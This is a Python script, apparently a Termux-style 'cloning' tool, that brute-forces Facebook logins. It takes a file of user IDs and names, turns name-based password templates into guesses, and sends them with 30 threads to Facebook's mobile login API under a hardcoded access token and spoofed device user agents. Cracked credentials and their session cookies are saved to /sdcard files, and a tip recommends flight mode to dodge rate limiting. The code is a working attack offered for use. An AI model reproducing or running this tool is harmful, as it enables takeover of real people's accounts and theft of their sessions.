#coding = utf-8
#This Open-Source Script is Written by Aqib Ali Khan
#Please Donot Forget to give Credit 
#Whatsapp : +923152056613
import os
import sys
import re
import random,zlib
import time
from time import sleep as sp
import string,json
import subprocess
import base64,uuid
from requests.exceptions import ConnectionError as CError
from concurrent.futures import ThreadPoolExecutor as tpd


try:
	import requests
except ImportError:
	os.system('pip install requests')


ses = requests.Session()

id = []
ok = []
cp =[]
loop = 0
pwx = []
method = []


##______COLORS____ARE________######
pwx=[]
W = '\033[97;1m'
R = '\033[91;1m'
G = '\033[92;1m'
Y = '\033[93;1m'
B = '\033[94;1m'
P = '\033[95;1m'
S = '\033[96;1m'
N = '\x1b[0m'
#________________________________________#
def clear():
	os.system("clear")

def line():
	print(52*'-')
def p(x):
	print(x)

def logo():
	logo = (f'''\033[1;97m                                    
@@@@@@@   @@@  @@@       @@@  @@@  @@@@@@@  @@@@@@@@  
@@@@@@@@  @@@  @@@       @@@  @@@  @@@@@@@  @@@@@@@@  
@@!  @@@  @@!  @@!       @@!  @@@    @@!    @@!       
\033[1;96m!@!  @!@  !@!  !@!       !@!  @!@    !@!    !@!       
@!@  !@!  !!@  @!!       @!@  !@!    @!!    @!!!:!    
\033[1;97m!@!  !!!  !!!  !!!       !@!  !!!    !!!    !!!!!:    
!!:  !!!  !!:  !!:       !!:  !!!    !!:    !!:       
:!:  !:!  :!:   :!:      :!:  !:!    :!:    :!:       
 :::: ::   ::   :: ::::  ::::: ::     ::     :: ::::  
:: :  :   :    : :: : :   : :  :      :     : :: ::   
[<>] The Original Codes are Written by Dilute Codes
---------------------------------------------------
 ╰◈▪➣ Author    : Dilute Codes( Aqib Ali )
 ╰◈▪➣ Github    : https://github.com/Dilute Codes
 ╰◈▪➣ Facebook  : Dilute Codes
 ╰◈▪➣ Version   : DC Extreme [1.2]
 ╰◈▪➣   \033[1;96mNaam Ki Dosti Kaam ki Yaari\n\tDosron Ki Tarah ! Adat Nhi Hamari \033[1;97m
---------------------------------------------------''')
	p(logo)


ua3 = "YAHN APNY 3RD USER AGENT LGANY HE "



ua2 = ' YH 2ND USERAGENTS LGALO METHOD 2 KY LIYE'

# USER AGENT FUNCTION UA 1 METHOD 1
def iAmAndroidUa():
	# YHN APNY ESE ANDROID KY UA LGANY HE MNE EXAMPLE KY LIYE IPHONE KY LGAY
	ios_version = random.choice(["Mozilla/5.0 (Macintosh; Intel Mac OS X 11_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5653.206 Safari/537.36 OPR/97.0.4046.162"])
	END = "[FBAN/FBIOS;FBAV/{str(random.randint(111,999))+'.0.0.'+str(random.randrange(1,30))+'.'+str(random.randint(111,999))};FBBV/{FBBV};FBDV/iPhone10,{random.choice(['1','5'])};FBMD/iPhone;FBSN/iOS;FBSV/{(ios_version).replace('_','.')};FBSS/2;FBCR/{random.choice(['Jazz','Zong'])};FBID/phone;FBLC/en_US;FBOP/5;FBRV/{random.choice(['106631002','0'])}]"
	ua = random.choice(["Dalvik/2.1.0 (Linux; U; Android 12; moto g(60)s Build/S3RLS32.114-25-1-5)","Dalvik/2.1.0 (Linux; U; Android 11; TV-SP01A Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 11; MAX2 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 12; LM-Q520N Build/SKQ1.211103.001)","Dalvik/2.1.0 (Linux; U; Android 9; SM-J810M Build/PPR1.180610.011) VD/218","Dalvik/1.6.0 (Linux; U; Android 4.4.2; P4502 Build/KOT49H)","Dalvik/2.1.0 (Linux; U; Android 10; SM-9005 Build/QQ2A.200405.005)","Dalvik/2.1.0 (Linux; U; Android 11; 2201117TY Build/RKQ1.211001.001) VD/213","Dalvik/2.1.0 (Linux; U; Android 9; kukui Build/R112-15359.58.0)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A226L Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 11; moto g go Build/RRHGS31.Q3-37-43-43-5-4-6)","Dalvik/2.1.0 (Linux; U; Android 11; DL4 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A346E Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2203 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 11; AKUS P1 Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-T805Y Build/MMB29K)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A336N Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A546V Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 7.1.2; M18 Build/NRD91N)","Dalvik/2.1.0 (Linux; U; Android 11; Lenovo K14 Build/RON31.267-94)","Dalvik/1.6.0 (Linux; U; Android 5.1; B906 Build/KOT49H)","Dalvik/2.1.0 (Linux; U; Android 10; Lenovo TB-X606F Build/QP1A.190711.020; BroadcastDotRadioApp )","Dalvik/2.1.0 (Linux; U; Android 10; PX4 Build/QQ2A.200305.004.A1)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge 30 Build/S1RDS32.55-106-4)","Dalvik/2.1.0 (Linux; U; Android 13; M2101K6I Build/TKQ1.221013.002)","Dalvik/2.1.0 (Linux; U; Android 11; Black X Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; M2007J1SC Build/TKQ1.221114.001)","Dalvik/2.1.0 (Linux; U; Android 13; T610K Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; moto e22 Build/SOW32.121-40)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; E100 Build/OPM2.171019.012)","Dalvik/2.1.0 (Linux; U; Android 10; VOG-L29 Build/HUAWEIVOG-L29) VD/218","Dalvik/2.1.0 (Linux; U; Android 7.0; TZ742 Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 13; motorola edge 40 pro Build/T1TR33.43-20-15)","Dalvik/2.1.0 (Linux; U; Android 12; Infinix X6823 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; motorola edge 20 lite Build/S2RKS32.92-11-21-13)","Dalvik/2.1.0 (Linux; U; Android 12; TECNO AD9 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; moto e22i Build/SOW32.121-40)","Dalvik/2.1.0 (Linux; U; Android 12; A202ZT Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; moto g31(w) Build/S3RWD32.123-29-8)","Dalvik/2.1.0 (Linux; U; Android 13; XQ-BQ72 Build/61.2.G.0.41)","Dalvik/2.1.0 (Linux; U; Android 5.1.1; MID Build/LMY47V)","Dalvik/2.1.0 (Linux; U; Android 10; TOX2 Build/QP1A.191105.004)","Dalvik/2.1.0 (Linux; U; Android 12; TANK 01 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; V1813T Build/P00610)","Dalvik/2.1.0 (Linux; U; Android 13; Pixel 4 XL Build/TQ2A.230405.003.E1)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2205 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 9; AFTTIFF43 Build/PS7633.3449N)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; i75 Build/O11019)","Dalvik/2.1.0 (Linux; U; Android 12; M8L Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 12; 220733SPI Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 11; P652 Pro Build/RP1A.201005.001)","Dalvik/2.1.0 (Linux; U; Android 7.1.1; BLADE A6 Build/NMF26F)","Dalvik/2.1.0 (Linux; U; Android 6.0; X60 Plus Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 12; L-41A Build/SKQ1.211103.001)","Dalvik/2.1.0 (Linux; U; Android 12; moto g200 5G Build/S1RXS32.50-13-5)","Dalvik/2.1.0 (Linux; U; Android 13; ASUS_AI2203_C Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 9; AFTBOXE1 Build/PS7600.3513N)","Dalvik/2.1.0 (Linux; U; Android 11; B610A115 Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 11; rammus Build/R112-15359.45.0)","Dalvik/2.1.0 (Linux; U; Android 12; Power Armor X11 Pro Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; SM-A127F Build/TP1A.220624.014) VD/213","Dalvik/2.1.0 (Linux; U; Android 5.1; Archos 55 Helium Plus Build/LMY47D)","Dalvik/2.1.0 (Linux; U; Android 6.0; hiPower Build/MRA58K)","Dalvik/2.1.0 (Linux; U; Android 13; RMX3562 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 11.1; p281 Build/NHG47L)","Dalvik/2.1.0 (Linux; U; Android 13; moto g73 5G Build/T1TN33.14-55-3)","Dalvik/2.1.0 (Linux; U; Android 9; moto g(7) supra Build/PCO29.114-134)","Dalvik/2.1.0 (Linux; U; Android 10; BRAVIA 4K VH21 Build/QTG3.200305.006.S292)","Dalvik/2.1.0 (Linux; U; Android 13; NE2213 Build/SKQ1.221119.001)","Dalvik/2.1.0 (Linux; U; Android 13; Nokia G10 Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 12; G52L Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; T702E_EEA Build/OPM1.171019.026)","Dalvik/2.1.0 (Linux; U; Android 12; SM-A025G Build/SP1A.210812.016; BroadcastDotRadioApp )","Dalvik/2.1.0 (Linux; U; Android 5.1.1; SM-G973N Build/LMY48Z)","Dalvik/2.1.0 (Linux; U; Android 9; ANE Build/HUAWEIANE)","Dalvik/2.1.0 (Linux; U; Android 11; SM-T550 Build/RQ3A.211001.001)","Dalvik/2.1.0 (Linux; U; Android 11; FP3 Build/8901.4.A.0022.0)","Dalvik/2.1.0 (Linux; U; Android 10; Freebox Player POP Build/QTT8.201201.002)","Dalvik/2.1.0 (Linux; U; Android 9; SM-G973F Build/PPR1.180720.122)","Dalvik/2.1.0 (Linux; U; Android 12; RT3 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 13; CPH2273 Build/TP1A.220905.001)","Dalvik/2.1.0 (Linux; U; Android 12; Chromecast Build/STTE.221215.004.A1)","Dalvik/2.1.0 (Linux; U; Android 12; sdk_goog3_gpc_x86_64 Build/SE2B.220326.027)","Dalvik/2.1.0 (Linux; U; Android 11; Neo_Plus Build/RP1A.200720.011)","Dalvik/2.1.0 (Linux; U; Android 13; moto g13 Build/THA33.31-24)","Dalvik/2.1.0 (Linux; U; Android 12; SM-T865N Build/SP2A.220305.013)","Dalvik/2.1.0 (Linux; U; Android 5.1; HUAWEI RIO-TL00 Build/HUAWEIRIO-TL00)","Dalvik/2.1.0 (Linux; U; Android 13; 21091116UI Build/TP1A.220624.014)","Dalvik/2.1.0 (Linux; U; Android 13; SO-51C Build/64.1.C.0.102A)","Dalvik/2.1.0 (Linux; U; Android 9; motorola one action Build/PSB29.105-27)","Dalvik/2.1.0 (Linux; U; Android 11; m7332 Build/RP1A.200720.011)","Dalvik/1.6.0 (Linux; U; Android 7.1; Tecno G660MAX Build/HonorG660MAX)","Dalvik/2.1.0 (Linux; U; Android 7.0; SM-N935F Build/NRD90M)","Dalvik/2.1.0 (Linux; U; Android 13; SOG08 Build/63.1.C.0.582)","Dalvik/2.1.0 (Linux; U; Android 12; Dslide_809 Build/SQ1A.220105.002)","Dalvik/2.1.0 (Linux; U; Android 8.1.0; GT6 Build/gt6)","Dalvik/2.1.0 (Linux; U; Android 12; LAVA LXX503 Build/SP1A.210812.016)","Dalvik/2.1.0 (Linux; U; Android 9; Playtv Build/PPR1.180610.011)","Dalvik/2.1.0 (Linux; U; Android 13; LM-G900N Build/TKQ1.220829.002)","Dalvik/2.1.0 (Linux; U; Android 11; motorola one 5G ace Build/RZKS31.Q3-45-16-9-11)",])+END
	return ua

	
class Main:
	def __init__(self):
		os.system('clear')
	def saved_results(self,ok,cp):
		if len(ok) != 0 or len(cp) != 0:
			p('\n')
			line()
			p(' [•] Cloning Process Has Been Completed ')
			p(' [•] Total OK Accounts : %s '%(len(ok)))
			p(' [•] Total CP Accounts : %s '%(len(cp)))
			line()
			input(' [•] Press Enter To Go Back To Main Menu ')
			self.menu()
	def menu(self):
		logo()
		p(' [•] This Script is Free Open-Souce Coded by Aqib Ali ID ')
		line()
		p(' [1] File Cracking ')
		p(" [2] Join Dilute Coders Facebook Group ")
		p(' [3] Join Dilute Coders Whatsapp Group ')
		line()
		m_1 = input(' [•] Choose : ')
		if m_1 == '1':
			self.methods_menu()
		elif m_1 == '2':
			os.system('xdg-open https://facebook.com/groups/124939013896146/')
			sp(1)
			self.menu()
		elif m_2 =='3':
			os.system('xdg-open https://chat.whatsapp.com/GzUiQ51HrLpDzebhrmsgYh')
		else:
			p(' [•] Wrong Select Hai Bhosdikay ')
			sp(1)
			self.menu()
	def methods_menu(self):
		line()
		p(' [1] Method 1 \n [2] Method 2 \n [3] Method 3')
		line()
		m_2 = input(' [•] Select Method : ')
		if m_2 == '1':
			method.append('i')
			self.cracking()
		elif m_2 == '2':
			method.append('ii')
			self.cracking()
		elif m_2 == '3':
			method.append('iii')
			self.cracking()
		else:
			p(' [•] Wrong Select Hai Bhosdikay ')
			sp(1)
			self.methods_menu()

	def cracking(self):
		clear()
		logo()
		try:
			file = input(' [•] Put File Path : ')
			id = open(file).read().splitlines()
			self.password_menu(id)
		except FileNotFoundError:
			p(' [X] File Path Wrong....')
			sp(2)
			self.cracking()

	def password_menu(self,id):
		clear()
		logo()
		p(' [•] Enter Password Limit Between 1 to 20 (Max) ')
		try:
			plimit = int(input(' [•] Put Limit : '))
			if plimit == '':
				plimit = 4
			elif plimit > 20:
				limit = 10
		except:
			plimit = 4
		clear();logo()
		print(' [•] Example : first123,last1122,firstlast,last Etc ')
		for n in range(plimit):
			pwx.append(input(' [•] Put Password %s : '%(n+1)))
		clear();logo()
		p(' [•] Dilute Brute Has Been Started ')
		line()
		p(' [•] Total Clone Accounts :  %s '%(len(id)))
		line()
		p(' [•] Use Flight ( Jahaz ) Mode Before / During Cloning ')
		line()
		with tpd(max_workers=30) as saqi:
			for user in id:
				uid,nm = user.split('|')
				if 'i' in method:
					saqi.submit(self.method1,uid,nm,pwx)
				elif 'ii' in method:
					saqi.submit(self.method2,uid,nm,pwx)
				elif 'iii' in method:
					saqi.submit(self.method3,uid,nm,pwx)
		self.saved_results(ok,cp)

	def method1(self,uid,nm,pwx):
		try:
			global ok , cp , loop
			sys.stdout.write('\r [AQIB] %s | M1 OK/CP %s/%s '%(loop,len(ok),len(cp)));sys.stdout.flush()
			fn = nm.split(' ')[0]
			try:
				ln = nm.split(' ')[1]
			except:
				ln = fn
			for ps in pwx:
				pw = ps.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',nm).replace('name',nm.lower())
				data = {"adid": str(uuid.uuid4()),
"format": "json",
"device_id": str(uuid.uuid4()),
"cpl": "true",
"family_device_id": str(uuid.uuid4()),
"credentials_type": "device_based_login_password",
"error_detail_type": "button_with_disabled",
"source": "device_based_login",
"email": uid,
"password": pw,
"access_token": "350685531728%7C62f8ce9f74b12f84c123cc23437a4a32",
"generate_session_cookies": "1",
"meta_inf_fbmeta": "",
"advertiser_id": str(uuid.uuid4()),
"currently_logged_in_userid": "0",
"locale": "en_GB",
"client_country_code": "GB",
"method": "auth.login",
"fb_api_req_friendly_name": "authenticate",
"fb_api_caller_class": "com.facebook.account.login.protocol.Fb4aAuthHandler",
"api_key": "882a8490361da98702bf97a021ddc14d"}
				headers = {'User-Agent': iAmAndroidUa(),
'Content-Type': 'application/x-www-form-urlencoded',
'Host': 'graph.facebook.com',
'X-FB-Net-HNI': str(random.randint(20000, 40000)),
'X-FB-SIM-HNI': str(random.randint(20000, 40000)),
'X-FB-Connection-Type': 'MOBILE.LTE',
'X-Tigon-Is-Retry': 'False',
'x-fb-session-id': 'nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62',
'x-fb-device-group': '5120',
'X-FB-Friendly-Name': 'ViewerReactionsMutation',
'X-FB-Request-Analytics-Tags': 'graphservice',
'X-FB-HTTP-Engine': 'Liger',
'X-FB-Client-IP': 'True',
'X-FB-Server-Cluster': 'True',
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62'}
				q = ses.post("https://b-graph.facebook.com/auth/login",data=data, headers=headers, allow_redirects=False).json()
				if "session_key" in q:
					coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);sb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
					cookie = f"sb={sb};{coki}"
					p('\r\033[1;92m[AQIB-OK] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/AQIB_M1_OK.txt','a').write(uid+'|'+pw+'\n')
					open('/sdcard/AQIB_M1_COOKIES.txt','a').write(uid+'|'+pw+'|'+cookie+'\n')
					break
				elif 'www.facebook.com' in q['error']['message']:
					p('\r\033[1;91m[AQIB-CP] %s | %s \033[1;97m '%(uid,pw))
					ok.append(uid)
					open('/sdcard/AQIB_M1_CP.txt','a').write(uid+'|'+pw+'\n')
					break
				else:
					continue
			loop+=1
		except requests.exceptions.ConnectionError:
				self.method1(uid,nm,pwx)

	def method2(self,uid,nm,pwx):
		#YE METHOD 2 HE
		print(" [ METHOD 2] YHN AP 2ND METHOD LGALO ...")
		exit()

	def method3(self,uid,nm,pwx):
		#YE METHOD 3 HE
		print(" [ METHOD 3 ] YHN AP 3RD METHOD LGALO ...")
		exit()

		exit()
if __name__=="__main__":
	Main().menu()